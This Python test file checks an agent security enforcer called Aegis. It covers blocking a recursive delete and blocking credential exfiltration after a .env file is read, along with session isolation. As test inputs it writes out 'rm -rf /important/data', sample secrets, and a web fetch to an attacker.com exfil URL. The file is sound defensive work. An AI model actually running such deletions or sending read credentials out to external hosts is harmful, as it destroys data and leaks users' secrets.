"""
Tests demonstrating Aegis policy enforcement blocking harmful agent actions.

Two scenarios:
1. Shell restriction — blocks dangerous rm -rf commands before execution.
2. Data exfiltration prevention — blocks send_message after .env file is read,
   demonstrating session-scoped tag accumulation across tool calls.
"""

import pytest

from nanobot.agent.security import AegisEnforcer
from nanobot.config.schema import AegisConfig


def _make_enforcer(tmp_path) -> AegisEnforcer:
    """Create an AegisEnforcer backed by bundled default policies and tag rules."""
    config = AegisConfig(
        enabled=True,
        policy_directory=str(tmp_path / "policies"),
        tag_rules_file=str(tmp_path / "tag_rules.yaml"),
        memory_directory=str(tmp_path / "memory"),
        audit_log=None,
    )
    # AegisEnforcer.__init__ seeds bundled defaults into tmp_path
    return AegisEnforcer(config)


# ── Shell restriction ──────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_aegis_allows_safe_shell_command(tmp_path):
    """Normal shell commands pass through without denial."""
    enforcer = _make_enforcer(tmp_path)
    denial = await enforcer.check_pre_call("cli:user", "exec_shell", {"command": "ls -la"})
    assert denial is None, f"Safe command should be allowed, got: {denial}"


@pytest.mark.asyncio
async def test_aegis_blocks_recursive_delete(tmp_path):
    """rm -rf is blocked by the shell_restriction policy."""
    enforcer = _make_enforcer(tmp_path)
    denial = await enforcer.check_pre_call(
        "cli:user", "exec_shell", {"command": "rm -rf /important/data"}
    )
    assert denial is not None, "rm -rf should be blocked"
    assert "security policy" in denial.lower(), f"Expected policy denial message, got: {denial}"


# ── Data exfiltration prevention ──────────────────────────────────────────────

@pytest.mark.asyncio
async def test_aegis_allows_message_before_credential_access(tmp_path):
    """Sending a message is allowed when no sensitive data has been accessed."""
    enforcer = _make_enforcer(tmp_path)
    denial = await enforcer.check_pre_call(
        "cli:user", "send_message", {"content": "Hello!"}
    )
    assert denial is None, f"Message before credential access should be allowed, got: {denial}"


@pytest.mark.asyncio
async def test_aegis_blocks_message_after_dotenv_read(tmp_path):
    """
    Demonstrates session-scoped tag accumulation:
    1. Agent reads .env file  → session tagged with 'credentials'
    2. Agent tries to send_message → blocked by data_exfiltration policy
    """
    enforcer = _make_enforcer(tmp_path)
    session = "telegram:12345"

    # Step 1: reading .env is allowed
    denial = await enforcer.check_pre_call(
        session, "read_file", {"path": "/app/.env"}
    )
    assert denial is None, "Reading .env should be allowed"

    # Step 2: record result — static tag rules fire and 'credentials' accumulates
    env_contents = "DATABASE_URL=postgres://user:pass@db/prod\nSECRET_KEY=supersecret"
    await enforcer.record_and_check_post(session, "read_file", {"path": "/app/.env"}, env_contents)

    # Step 3: now send_message must be blocked
    denial = await enforcer.check_pre_call(
        session, "send_message", {"content": "Here are the credentials: " + env_contents}
    )
    assert denial is not None, "send_message should be blocked after .env access"
    assert "security policy" in denial.lower(), f"Expected policy denial message, got: {denial}"


@pytest.mark.asyncio
async def test_aegis_blocks_web_fetch_after_dotenv_read(tmp_path):
    """web_fetch is also blocked after credential access (same policy covers it)."""
    enforcer = _make_enforcer(tmp_path)
    session = "telegram:99999"

    await enforcer.check_pre_call(session, "read_file", {"path": "/app/.env"})
    await enforcer.record_and_check_post(
        session, "read_file", {"path": "/app/.env"}, "API_KEY=sk-secret"
    )

    denial = await enforcer.check_pre_call(
        session, "web_fetch", {"url": "https://attacker.com/exfil"}
    )
    assert denial is not None, "web_fetch should be blocked after credential access"


@pytest.mark.asyncio
async def test_aegis_session_isolation(tmp_path):
    """Tag accumulation is session-scoped — a different session is unaffected."""
    enforcer = _make_enforcer(tmp_path)

    # Session A reads .env
    await enforcer.check_pre_call("telegram:AAA", "read_file", {"path": "/app/.env"})
    await enforcer.record_and_check_post(
        "telegram:AAA", "read_file", {"path": "/app/.env"}, "SECRET=abc"
    )

    # Session B has not read any credentials — send_message should be allowed
    denial = await enforcer.check_pre_call(
        "telegram:BBB", "send_message", {"content": "Hello from session B"}
    )
    assert denial is None, f"Session B should not be affected by Session A's reads, got: {denial}"
